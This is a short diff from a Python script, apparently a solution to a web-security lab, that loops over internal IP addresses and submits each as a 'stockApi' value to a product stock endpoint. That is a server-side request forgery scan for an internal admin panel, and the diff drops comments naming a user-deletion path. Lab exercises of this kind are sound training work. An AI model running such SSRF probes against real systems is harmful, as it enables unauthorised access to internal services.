@@ -11,8 +11,6 @@ cookies = {"Session": args.session}
 found_it = ""
 for i in range(1,255):
     data = {"stockApi": f"http://192.168.0.{i}:8080/admin/"}
-    # delete?username=carlos
-    # It's 206
 
     url = f"{args.url}product/stock/"
 
